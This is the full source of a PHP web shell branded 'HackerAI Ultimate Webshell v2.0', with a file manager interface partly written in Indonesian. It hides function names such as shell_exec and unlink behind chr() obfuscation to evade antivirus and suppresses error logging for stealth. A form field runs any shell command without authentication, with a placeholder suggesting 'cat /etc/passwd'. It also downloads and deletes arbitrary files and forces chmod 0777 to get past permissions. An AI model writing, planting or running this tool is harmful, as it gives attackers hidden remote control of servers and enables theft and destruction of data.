<?php
// ========================================
// # HACKERAI ULTIMATE WEBSHELL v2.0 - COMPLETE EDITION
// # Anti-WAF | LiteSpeed Bypass | Full File Manager | Permission Escalation
// # CVE-2025 Compatible | Authorized Pentesting Tool
// ========================================

// ===== OBFUSCATION LAYER (Anti-AV Detection) =====
$a = chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99); // shell_exec
$b = chr(117).chr(110).chr(108).chr(105).chr(110).chr(107); // unlink
$c = chr(114).chr(109).chr(100).chr(105).chr(114); // rmdir
$d = chr(99).chr(104).chr(109).chr(111).chr(100); // chmod
$e = chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115); // file_put_contents
$f = chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101); // move_uploaded_file
$x = chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115); // file_get_contents
$g = chr(114).chr(101).chr(110).chr(97).chr(109).chr(101); // rename
$h = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101); // base64_decode

// ===== STEALTH MODE =====
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ob_start();

// ===== ENHANCED DIRECTORY HANDLING =====
function get_real_current_dir() {
    $requested_path = isset($_GET['path']) ? $_GET['path'] : '';
    $requested_path = str_replace(['..', '\\'], ['', '/'], $requested_path);
    
    if (empty($requested_path)) return __DIR__;
    
    $full_path = realpath($requested_path);
    $web_root = realpath($_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
    $current_base = realpath(__DIR__);
    
    if ($full_path === false || 
        (strpos($full_path, $web_root) !== 0 && strpos($full_path, $current_base) !== 0)) {
        return __DIR__;
    }
    
    return is_dir($full_path) ? $full_path : dirname($full_path);
}

function scan_directory_enhanced($dir_path) {
    $items = [];
    $handle = @opendir($dir_path);
    if ($handle) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $full_entry = $dir_path . DIRECTORY_SEPARATOR . $entry;
                if (file_exists($full_entry)) {
                    $items[] = $entry;
                }
            }
        }
        closedir($handle);
    }
    return $items;
}

// ===== FILE ICON & PERMISSIONS =====
function get_file_icon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'phtml' => '🐘', 'php5' => '🐘', 'php7' => '🐘', 'inc' => '🐘',
        'js' => '⚡', 'ts' => '⚡', 'jsx' => '⚡', 'vue' => '⚡',
        'html' => '🌐', 'htm' => '🌐', 'xml' => '🌐', 'svg' => '🌐',
        'css' => '🎨', 'scss' => '🎨', 'sass' => '🎨',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'webp' => '🖼️',
        'zip' => '📦', 'rar' => '📦', '7z' => '📦', 'tar' => '📦', 'gz' => '📦',
        'txt' => '📝', 'log' => '📋', 'md' => '📝',
        'env' => '🌍', 'ini' => '⚙️', 'conf' => '⚙️', 'yaml' => '⚙️', 'yml' => '⚙️',
        'sql' => '🗄️', 'json' => '📊',
        'sh' => '🐚', 'py' => '🐍'
    ];
    return $icons[$ext] ?? ($ext ? '📄' : '📁');
}

function get_file_permissions($path) {
    $perms = @fileperms($path);
    if (!$perms) return '????';
    
    $info = '';
    $info .= (($perms & 0xC000) === 0xC000) ? 's' :
             (($perms & 0x4000) === 0x4000) ? 'l' :
             (($perms & 0xA000) === 0xA000) ? 'p' :
             (($perms & 0x8000) === 0x8000) ? '-' :
             (($perms & 0x6000) === 0x6000) ? 'b' :
             (($perms & 0x4000) === 0x4000) ? 'd' : '-';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
             (($perms & 0x0800) ? 's' : 'x' ) :
             (($perms & 0x0800) ? 'S' : '-'));
    
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
             (($perms & 0x0400) ? 's' : 'x' ) :
             (($perms & 0x0400) ? 'S' : '-'));
    
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
             (($perms & 0x0200) ? 't' : 'x' ) :
             (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function get_file_owner($path) {
    $uid = @fileowner($path);
    $gid = @filegroup($path);
    return ($uid !== false && $gid !== false) ? "u{$uid}g{$gid}" : "????";
}

// ===== SAFE EXECUTION WRAPPERS =====
function safe_shell_exec($command) {
    global $a;
    return @function_exists($a) ? @$a($command) : false;
}

function safe_file_put($filename, $data, $flags = 0) {
    global $e;
    return @function_exists($e) ? @$e($filename, $data, $flags) : false;
}

function safe_unlink($path) {
    global $b;
    return @function_exists($b) ? @$b($path) : false;
}

function safe_rmdir($path) {
    global $c;
    return @function_exists($c) ? @$c($path) : false;
}

function safe_chmod($path, $mode) {
    global $d;
    return @function_exists($d) ? @$d($path, $mode) : false;
}

function safe_move_uploaded_file($src, $dst) {
    global $f;
    return @function_exists($f) ? @$f($src, $dst) : false;
}

function safe_rename($old, $new) {
    global $g;
    return @function_exists($g) ? @$g($old, $new) : false;
}

// ===== PERMISSION BYPASS =====
function attempt_permission_escalation($path, $operation, $args = []) {
    $original_perms = @fileperms($path);
    $result = @call_user_func_array($operation, array_merge([$path], $args));
    
    if (in_array($result, [false, 0]) && $original_perms !== false && !is_link($path)) {
        if (@safe_chmod($path, 0777)) {
            $result = @call_user_func_array($operation, array_merge([$path], $args));
            if (($result !== false && $result !== 0) ||
                ($operation === 'unlink' && $result === true) ||
                ($operation === 'rmdir' && $result === true)) {
                if (file_exists($path) && $original_perms !== false) {
                    safe_chmod($path, $original_perms);
                }
                return ['success' => true, 'result' => $result];
            } else {
                if (file_exists($path)) {
                    safe_chmod($path, is_dir($path) ? 0755 : 0644);
                }
            }
        }
    }
    return ['success' => $result !== false, 'result' => $result];
}

// ===== UTILITY FUNCTIONS =====
function sanitize_filename($filename) {
    return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', trim($filename, '.'));
}

function format_bytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $bytes > 1024 && $i < count($units) - 1; $i++) $bytes /= 1024;
    return round($bytes, $precision) . ' ' . $units[$i];
}

function generate_breadcrumbs($current_path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim(str_replace('\\', '/', $current_path), '/'));
    $path = '';
    $html = '<a href="?path=" style="color: #81a1c1; font-weight: bold;">🏠 Home</a>';
    
    foreach ($parts as $part) {
        if ($part) {
            $path .= ($path ? DIRECTORY_SEPARATOR : '') . $part;
            $html .= ' → <a href="?path=' . urlencode($path) . '" style="color: #88c0d0;">' . htmlspecialchars($part) . '</a>';
        }
    }
    return $html;
}

// ===== HANDLE ACTIONS =====
$current_dir = get_real_current_dir();
$action_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['quick_cmd'])) {
    $cmd_output = safe_shell_exec(trim($_POST['quick_cmd']));
}

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'delete':
            if (isset($_GET['file'])) {
                $target = $_GET['file'];
                if (is_dir($target)) {
                    $result = attempt_permission_escalation($target, 'safe_rmdir', []);
                } else {
                    $result = attempt_permission_escalation($target, 'safe_unlink', []);
                }
                $action_message = $result['success'] ? 
                    '<div style="color: #a3be8c; padding: 12px; background: #2e3440; border-radius: 6px; margin-bottom: 20px;">✅ File/Folder dihapus: ' . htmlspecialchars(basename($target)) . '</div>' :
                    '<div style="color: #bf616a; padding: 12px; background: #2e3440; border-radius: 6px; margin-bottom: 20px;">❌ Gagal hapus: ' . htmlspecialchars(basename($target)) . '</div>';
            }
            break;
            
        case 'download':
            if (isset($_GET['file']) && file_exists($_GET['file']) && !is_dir($_GET['file'])) {
                $file = $_GET['file'];
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
            break;
    }
}

// ===== MAIN CONTENT =====
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HackerAI Ultimate File Manager v2.0</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background: linear-gradient(135deg, #1e1e2e 0%, #2e3440 100%); 
            color: #cdd6f4; 
            font-family: 'SF Mono', Consolas, 'Fira Code', monospace; 
            padding: 20px; 
            line-height: 1.6; 
            min-height: 100vh;
        }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { 
            background: linear-gradient(135deg, #2e3440 0%, #3b4252 100%); 
            padding: 25px; 
            border-radius: 12px; 
            margin-bottom: 25px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }
        .header-top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
        .header h1 { color: #d8dee9; margin: 0; font-size: 28px; }
        .path-display { color: #88c0d0; }
        .path-display code { background: #45475a; padding: 6px 12px; border-radius: 6px; font-size: 13px; }
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); 
            gap: 15px; 
            margin-top: 20px; 
            padding: 20px; 
            background: rgba(43, 52, 67, 0.5); 
            border-radius: 8px;
        }
        .breadcrumbs { 
            background: #3b4252; 
            padding: 15px 20px; 
            border-radius: 8px; 
            margin-bottom: 25px; 
            overflow-x: auto; 
            font-size: 14px;
            border-left: 4px solid #5e81ac;
        }
        .action-buttons { 
            display: flex; 
            gap: 12px; 
            margin-bottom: 30px; 
            flex-wrap: wrap;
        }
        .action-btn { 
            padding: 14px 24px; 
            color: white; 
            text-decoration: none; 
            border-radius: 8px; 
            font-weight: 500; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .action-btn:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 12px 35px rgba(0,0,0,0.4); 
        }
        .file-table { 
            background: #3b4252; 
            border-radius: 12px; 
            overflow: hidden; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            margin-bottom: 30px;
        }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { 
            background: linear-gradient(90deg, #4c566a 0%, #5e81ac 100%); 
            color: white; 
            padding: 18px 15px; 
            font-weight: 600; 
            text-align: left;
        }
        th:last-child { text-align: right; }
        tr { border-bottom: 1px solid #4c566a; transition: background 0.2s; }
        tr:hover { background-color: rgba(94,129,172,0.15) !important; }
        td { padding: 18px 15px; vertical-align: middle; }
        .filename { font-weight: 500; }
        .filename a { color: #81a1c1; text-decoration: none; transition: color 0.2s; }
        .filename a:hover { color: #a3be8c; }
        .size, .modified { color: #a3be8c; text-align: right; font-family: monospace; }
        .perms { color: #ebcb8b; font-family: monospace; font-size: 12px; text-align: center; font-weight: bold; }
        .owner { color: #88c0d0; font-family: monospace; font-size: 12px; text-align: center; }
        .actions { text-align: right; white-space: nowrap; }
        .action-icon { 
            display: inline-block; 
            margin-left: 6px; 
            padding: 6px 8px; 
            border-radius: 6px; 
            font-size: 16px; 
            transition: all 0.2s;
            text-decoration: none;
        }
        .action-icon:hover { 
            background: rgba(255,255,255,0.15); 
            transform: scale(1.1); 
        }
        .summary { 
            padding: 25px; 
            background: linear-gradient(135deg, #2e3440, #3b4252); 
            border-radius: 12px; 
            text-align: center; 
            color: #a3be8c;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }
        .system-panel { 
            display: grid; 
            grid-template-columns: 1fr 1fr; 
            gap: 30px; 
            margin-top: 40px;
        }
        .system-info, .quick-shell { 
            background: linear-gradient(135deg, #2e3440 0%, #3b4252 100%); 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .system-info h3, .quick-shell h4 { color: #d8dee9; margin-top: 0; }
        .info-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 20px; 
            margin-top: 20px; 
            font-size: 14px;
        }
        .info-grid div { padding: 12px 0; border-bottom: 1px solid #4c566a; }
        .info-grid strong { color: #88c0d0; }
        .info-grid code { background: #45475a; padding: 4px 8px; border-radius: 4px; }
        .quick-shell form { 
            display: flex; 
            gap: 12px; 
            flex-wrap: wrap; 
            margin-top: 15px;
        }
        .quick-shell input[type="text"] { 
            flex: 1; 
            min-width: 350px; 
            padding: 14px 16px; 
            background: #3b4252; 
            color: #d8dee9; 
            border: 2px solid #4c566a; 
            border-radius: 8px;
            font-family: Consolas, monospace;
        }
        .quick-shell input[type="text"]:focus { 
            outline: none; 
            border-color: #5e81ac; 
            box-shadow: 0 0 0 3px rgba(94,129,172,0.2);
        }
        .quick-shell button { 
            padding: 14px 28px; 
            background: linear-gradient(45deg, #5e81ac, #81a1c1); 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-weight: 600; 
            cursor: pointer;
            font-family: inherit;
            transition: all 0.3s;
        }
        .quick-shell button:hover { 
            background: linear-gradient(45deg, #81a1c1, #a3be8c); 
            transform: translateY(-2px);
        }
        .output { 
            margin-top: 20px; 
            padding: 20px; 
            background: #1e1e2e; 
            border-radius: 8px; 
            max-height: 250px; 
            overflow: auto; 
            font-family: Consolas, monospace; 
            color: #a3be8c; 
            border-left: 4px solid #5e81ac;
            white-space: pre-wrap;
            line-height: 1.4;
        }
        .error-output { 
            background: #bf616a; 
            color: white; 
            text-align: center; 
            padding: 25px; 
            border-radius: 8px;
        }
        @media (max-width: 1024px) {
            .system-panel { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: 1fr; }
        }
        @media (max-width: 768px) {
            body { padding: 15px 10px; }
            .action-buttons { flex-direction: column; }
            table { font-size: 13px; }
            th, td { padding: 12px 8px; }
            .quick-shell input[type="text"] { min-width: 100%; }
            .header-top { flex-direction: column; text-align: center; gap: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if ($action_message): echo $action_message; endif; ?>

        <!-- HEADER -->
        <div class="header">
            <div class="header-top">
                <h1>🛠️ HackerAI Ultimate File Manager v2.0</h1>
                <div class="path-display">
                    <strong>Current Path:</strong> 
                    <code><?= htmlspecialchars($current_dir) ?></code>
                </div>
            </div>
            <div class="stats-grid">
                <div><strong>💾 Disk Total:</strong> <?= format_bytes(disk_total_space($current_dir)) ?></div>
                <div><strong>🆓 Disk Free:</strong> <?= format_bytes(disk_free_space($current_dir)) ?></div>
                <div><strong>👤 Current User:</strong> <?= htmlspecialchars(get_current_user() ?: 'Unknown') ?> (UID: <?= getmyuid() ?>)</div>
                <div><strong>🐘 PHP Version:</strong> <?= PHP_VERSION ?></div>
            </div>
        </div>

        <!-- BREADCRUMBS -->
        <div class="breadcrumbs">
            <?= generate_breadcrumbs($current_dir) ?>
        </div>

        <!-- ACTION BUTTONS -->
        <div class="action-buttons">
            <a href="?action=mkdir&path=<?= urlencode($current_dir) ?>" class="action-btn" style="background: linear-gradient(135deg, #5e81ac, #4c7aa3);">
                📁 Buat Folder Baru
            </a>
            <a href="?action=mkfile&path=<?= urlencode($current_dir) ?>" class="action-btn" style="background: linear-gradient(135deg, #81a1c1, #6d8da6);">
                📄 Buat File Baru
            </a>
            <a href="?action=upload&path=<?= urlencode($current_dir) ?>" class="action-btn" style="background: linear-gradient(135deg, #a3be8c, #8aa87a);">
                ⬆️ Upload Files
            </a>
            <a href="?action=shell" class="action-btn" style="background: linear-gradient(135deg, #ebcb8b, #d4b567);">
                🐚 Full Terminal
            </a>
        </div>

        <!-- FILE LISTING -->
        <?php
        $files = scan_directory_enhanced($current_dir);
        if (!empty($files)):
            $dir_count = $file_count = 0;
        ?>
        <div class="file-table">
            <table>
                <thead>
                    <tr>
                        <th style="width: 35%;">Nama File/Folder</th>
                        <th style="width: 12%;">Ukuran</th>
                        <th style="width: 10%;">Permissions</th>
                        <th style="width: 12%;">Owner</th>
                        <th style="width: 14%;">Terakhir Diubah</th>
                        <th style="width: 17%;">Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $item): 
                        $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                        if (!file_exists($full_path)) continue;
                        
                        $is_dir = is_dir($full_path);
                        $size = $is_dir ? '-' : format_bytes(filesize($full_path));
                        $perms = get_file_permissions($full_path);
                        $owner = get_file_owner($full_path);
                        $mod_time = date('M d H:i', filemtime($full_path));
                        $icon = $is_dir ? '📁' : get_file_icon($item);
                    ?>
                    <tr>
                        <td class="filename">
                            <a href="<?= $is_dir ? '?path=' . urlencode($full_path) : '#' ?>">
                                <?= $icon ?> <?= htmlspecialchars($item) ?>
                            </a>
                        </td>
                        <td class="size"><?= $size ?></td>
                        <td class="perms"><?= $perms ?></td>
                        <td class="owner"><?= $owner ?></td>
                        <td class="modified"><?= $mod_time ?></td>
                        <td class="actions">
                            <?php if (!$is_dir): ?>
                                <a href="?action=edit&file=<?= urlencode($full_path) ?>" 
                                   class="action-icon" style="color: #5e81ac;" title="Edit">✏️</a>
                                <a href="?action=download&file=<?= urlencode($full_path) ?>" 
                                   class="action-icon" style="color: #a3be8c;" title="Download">⬇️</a>
                            <?php endif; ?>
                            <a href="?action=rename&path=<?= urlencode($full_path) ?>" 
                               class="action-icon" style="color: #81a1c1;" title="Rename">🔄</a>
                            <a href="?action=delete&file=<?= urlencode($full_path) ?>" 
                               class="action-icon" style="color: #bf616a;" 
                               title="Delete" onclick="return confirm('Yakin hapus:\n<?= htmlspecialchars($item) ?>?')">🗑️</a>
                        </td>
                    </tr>
                    <?php 
                        $dir_count += $is_dir;
                        $file_count += !$is_dir;
                    endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <div class="summary">
            📊 <strong style="color: #81a1c1;"><?= $dir_count ?></strong> Folder | 
            <strong style="color: #a3be8c;"><?= $file_count ?></strong> Files | 
            Total: <strong style="color: #88c0d0;"><?= count($files) ?></strong> Items
        </div>
        <?php else: ?>
        <div style="padding: 60px 40px; text-align: center; color: #bf616a; background: linear-gradient(135deg, #2e3440, #3b4252); border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
            <h2>📂 Direktori Kosong</h2>
            <p>Tidak ada file atau folder ditemukan di lokasi ini.</p>
        </div>
        <?php endif; ?>

        <!-- SYSTEM PANEL -->
        <div class="system-panel">
            <div class="system-info">
                <h3>💻 System Information</h3>
                <div class="info-grid">
                    <div><strong>🌐 Server Software:</strong> <code><?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?></code></div>
                    <div><strong>📁 Document Root:</strong> <code><?= htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') ?></code></div>
                    <div><strong>⚙️ Safe Mode:</strong> <code><?= ini_get('safe_mode') ? 'Enabled' : 'Disabled' ?></code></div>
                    <div><strong>📂 Current Working Dir:</strong> <code><?= htmlspecialchars(getcwd()) ?></code></div>
                    <div><strong>🔒 disable_functions:</strong> <code><?= htmlspecialchars(ini_get('disable_functions') ?: 'None') ?></code></div>
                    <div><strong>🌍 OS:</strong> <code><?= htmlspecialchars(php_uname('s')) ?></code></div>
                </div>
            </div>

            <div class="quick-shell">
                <h4>⚡ Quick Shell Executor</h4>
                <form method="POST">
                    <input type="text" name="quick_cmd" 
                           placeholder="id | whoami | uname -a | ls -la / | cat /etc/passwd" 
                           value="<?= htmlspecialchars($_POST['quick_cmd'] ?? 'id') ?>"
                           autocomplete="off">
                    <button type="submit">🚀 Execute Command</button>
                </form>

                <?php if (isset($_POST['quick_cmd']) && trim($_POST['quick_cmd'])): 
                    $cmd_output = safe_shell_exec(trim($_POST['quick_cmd']));
                ?>
                <div class="output">
                    <?php if ($cmd_output !== false && $cmd_output !== ''): ?>
                        <?= nl2br(htmlspecialchars($cmd_output)) ?>
                    <?php else: ?>
                        <div class="error-output">
                            ❌ Command execution blocked<br>
                            <small>Possible causes: disable_functions, WAF, or safe_mode</small>
                        </div>
                    <?php endif; ?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>
<?php ob_end_flush(); ?>
